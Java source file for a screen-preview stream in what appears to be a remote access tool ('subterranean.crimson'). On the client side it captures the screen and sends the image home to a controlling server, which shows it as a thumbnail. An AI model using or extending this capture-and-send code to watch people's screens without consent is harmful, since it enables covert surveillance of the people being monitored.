package subterranean.crimson.universal.streams;

import javax.swing.ImageIcon;

import subterranean.crimson.permajar.stage1.network.Communications;
import subterranean.crimson.permajar.stage2.modules.ScreenShot;
import subterranean.crimson.server.commands.ClientCommands;
import subterranean.crimson.server.graphics.panels.mainscreen.MainPane;
import subterranean.crimson.server.network.Connection;
import subterranean.crimson.universal.BMN;
import subterranean.crimson.universal.Utilities;
import subterranean.crimson.universal.containers.Message;

public class PreviewStream extends Stream {

	private int x;// width of the screen

	public PreviewStream(long p, boolean i, int w, Connection c) {
		super(p, i, c);
		x = w;
		ClientCommands.startPreviewStream(c, getStreamID(), p, w);
	}

	public PreviewStream(long p, boolean i, int w) {
		super(p, i);
		x = w;
		start();
	}

	public void setX(int w) {
		x = w;
	}

	@Override
	public void received(Message m) {
		// update the profile
		c.getProfile().info.setPreview((ImageIcon) m.auxObject[1]);
		MainPane.dp.updateAll();
	}

	@Override
	public void send() {
		Message m = new Message(Utilities.randId(), BMN.STREAM_data);
		Object[] o = { getStreamID(), ScreenShot.run(x) };
		m.auxObject = o;

		Communications.sendHome(m);
	}

}
